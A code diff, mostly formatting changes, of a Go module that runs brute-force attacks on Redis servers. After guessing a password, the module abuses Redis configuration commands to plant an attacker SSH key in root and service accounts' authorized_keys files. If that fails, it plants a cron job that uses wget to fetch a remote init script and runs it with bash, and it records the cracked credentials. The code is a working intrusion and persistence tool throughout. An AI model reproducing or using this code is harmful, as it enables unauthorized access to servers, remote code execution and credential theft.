@@ -19,15 +19,14 @@ var RedisBruteForceTasks = 10
 var SSHPrivKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrnTiLebNXrlu48q3mAZVXEfVICM9c1Amqip1Sy6+1kVPAjkmvohXbC0qxY0wfVaao7z0JEuOhN3Yx1DxPaGxKoLMyEguzpOLny2SZatndekqhvRp40rNfVA/0J/H5l4T8FGNbKrAGFPj37ZqzGyD74HhkT8iAL615PdBnAVneNK4rn+R3xT5KQEsJUr2yL36WyOPUNub3SqylT7MGL7nLVb345a/E5NNvbOPlE8IRwqgRcLdQf7fLJ/1s/68UnAlRHgFwBz4x59efTx1Z+wjgqyd4Ou6+65mSc22bnTX5hvDTeFJQsYjeE+bhllmgN9LDg1TUpMZl369jNJkkhkjFUIB5pZMycW3CxcUoQudrMFjrpnCFk1RJPmHSmfHX5vWbMVFPrNIyUhY3+8yLegOY/H6x1HIydklYGUVjI8rPwm2ngvBimzfp/B6FsmqnwNsEX0AqS5ojPnki9xKKlr7t1ZXE8ASahKgiy5uoTx2bKD3+jD6hRUuVSxqVYlOXeYc= root@master"
 
 type RedisBruteforceAttack struct {
-
 	dictPool    *DictPool
 	attackTasks *attack.AttackTasks
 }
 
-func NewRedisBruteforceAttack(dictPool *DictPool,attackTasks *attack.AttackTasks) *RedisBruteforceAttack{
+func NewRedisBruteforceAttack(dictPool *DictPool, attackTasks *attack.AttackTasks) *RedisBruteforceAttack {
 
 	return &RedisBruteforceAttack{
-		dictPool: dictPool,
+		dictPool:    dictPool,
 		attackTasks: attackTasks,
 	}
 }
@@ -62,26 +61,26 @@ func (rba *RedisBruteforceAttack) Accept(target source.Target) bool {
 	return false
 }
 
-func (rba *RedisBruteforceAttack) doSSHAttack(redisClient *redis.RedisClient,ip string,cmd string) error {
+func (rba *RedisBruteforceAttack) doSSHAttack(redisClient *redis.RedisClient, ip string, cmd string) error {
 
-	authPathMap  := map[string]string{"root":"/root/.ssh/","redis":"/home/redis/.ssh/","server":"/home/server/.ssh/"}
+	authPathMap := map[string]string{"root": "/root/.ssh/", "redis": "/home/redis/.ssh/", "server": "/home/server/.ssh/"}
 
 	auth := "authorized_keys"
-	content := fmt.Sprintf("\n%s\n",SSHPrivKey)
+	content := fmt.Sprintf("\n%s\n", SSHPrivKey)
 
-	for user,authPath:= range authPathMap {
+	for user, authPath := range authPathMap {
 
-		redisClient.ConfigSet("dir",authPath)
-		redisClient.Set("x",content)
+		redisClient.ConfigSet("dir", authPath)
+		redisClient.Set("x", content)
 
-		redisClient.ConfigSet("dbfilename",auth)
+		redisClient.ConfigSet("dbfilename", auth)
 
-		if _,err := redisClient.Save();err==nil {
+		if _, err := redisClient.Save(); err == nil {
 
 			//ok
-			sshClient,err := ssh.LoginWithPrivKey(ip,22,user,SSHPrivKey,int64(RedisTimeout))
+			sshClient, err := ssh.LoginWithPrivKey(ip, 22, user, SSHPrivKey, int64(RedisTimeout))
 
-			if err!=nil {
+			if err != nil {
 				return err
 			}
 
@@ -99,19 +98,19 @@ func (rba *RedisBruteforceAttack) doSSHAttack(redisClient *redis.RedisClient,ip 
 
 }
 
-func (rba *RedisBruteforceAttack) doCronAttack(redisClient *redis.RedisClient,cmd string) error {
+func (rba *RedisBruteforceAttack) doCronAttack(redisClient *redis.RedisClient, cmd string) error {
 
-	pathMap := map[string]string {"root":"/var/spool/cron/","server":"/var/spool/cron/","redis":"/var/spool/cron/","roote":"/etc/cron.d/"}
-	cronShell := fmt.Sprintf("\n* * * * * %s \n",cmd)
+	pathMap := map[string]string{"root": "/var/spool/cron/", "server": "/var/spool/cron/", "redis": "/var/spool/cron/", "roote": "/etc/cron.d/"}
+	cronShell := fmt.Sprintf("\n* * * * * %s \n", cmd)
 
-	for user,path:= range pathMap {
+	for user, path := range pathMap {
 
-		redisClient.ConfigSet("dir",path)
-		redisClient.Set("x",cronShell)
+		redisClient.ConfigSet("dir", path)
+		redisClient.Set("x", cronShell)
 
-		redisClient.ConfigSet("dbfilename",user)
+		redisClient.ConfigSet("dbfilename", user)
 
-		if _,err := redisClient.Save();err==nil {
+		if _, err := redisClient.Save(); err == nil {
 
 			//ok
 			return nil
@@ -122,23 +121,22 @@ func (rba *RedisBruteforceAttack) doCronAttack(redisClient *redis.RedisClient,cm
 
 }
 
-func (rba *RedisBruteforceAttack) doAttack(redisClient *redis.RedisClient,ip string, port int, user string, passwd string) {
+func (rba *RedisBruteforceAttack) doAttack(redisClient *redis.RedisClient, ip string, port int, user string, passwd string) {
 
 	var ap *attack.AttackProcess
 
-	initUrl := rba.attackTasks.DownloadInitUrl(ip,port,RedisBruteForceAttackType,"init.sh")
+	initUrl := rba.attackTasks.DownloadInitUrl(ip, port, RedisBruteForceAttackType, "init.sh.tpl")
 
-	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh;bash /var/tmp/init.sh",initUrl)
+	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh.tpl;bash /var/tmp/init.sh.tpl", initUrl)
 
-	redisClient.ConfigSet("stop-writes-on-bgsave-error","no")
+	redisClient.ConfigSet("stop-writes-on-bgsave-error", "no")
 	redisClient.SlaveOfNoOne()
 
+	err := rba.doSSHAttack(redisClient, ip, cmd)
 
-	err := rba.doSSHAttack(redisClient,ip,cmd)
-
-	if err!=nil {
+	if err != nil {
 		//try to attack by cron
-		rba.doCronAttack(redisClient,cmd)
+		rba.doCronAttack(redisClient, cmd)
 	}
 
 	ap = &attack.AttackProcess{
@@ -153,8 +151,8 @@ func (rba *RedisBruteforceAttack) doAttack(redisClient *redis.RedisClient,ip str
 		Type:     RedisBruteForceAttackType,
 		Status:   0,
 		Payload:  cmd,
-		Result:"",
-		Details: fmt.Sprintf("%s|%s",user,passwd),
+		Result:   "",
+		Details:  fmt.Sprintf("%s|%s", user, passwd),
 	}
 
 	rba.PubProcess(ap)
@@ -162,11 +160,11 @@ func (rba *RedisBruteforceAttack) doAttack(redisClient *redis.RedisClient,ip str
 
 func (rba *RedisBruteforceAttack) tryBruteforce(ip string, port int, entry *DictEntry) {
 
-	redisClient := redis.NewRedisClient(ip,port,entry.pass, uint64(RedisTimeout),0)
+	redisClient := redis.NewRedisClient(ip, port, entry.pass, uint64(RedisTimeout), 0)
 
-	info,err:= redisClient.Info()
+	info, err := redisClient.Info()
 
-	if err!=nil || !strings.Contains(info,"redis_version:"){
+	if err != nil || !strings.Contains(info, "redis_version:") {
 
 		//login failed
 		return
@@ -174,7 +172,7 @@ func (rba *RedisBruteforceAttack) tryBruteforce(ip string, port int, entry *Dict
 
 	//login ok,start to attack
 
-	rba.doAttack(redisClient,ip,port,entry.user,entry.pass)
+	rba.doAttack(redisClient, ip, port, entry.user, entry.pass)
 
 }
 
@@ -199,7 +197,7 @@ func (rba *RedisBruteforceAttack) Run(target source.Target) error {
 	var wg sync.WaitGroup
 	wg.Add(RedisBruteForceTasks)
 
-	for i:=0;i<RedisBruteForceTasks;i++ {
+	for i := 0; i < RedisBruteForceTasks; i++ {
 
 		go func() {
 
@@ -210,7 +208,7 @@ func (rba *RedisBruteforceAttack) Run(target source.Target) error {
 					break
 				}
 
-				rba.tryBruteforce(ip,port,entry)
+				rba.tryBruteforce(ip, port, entry)
 
 			}
 
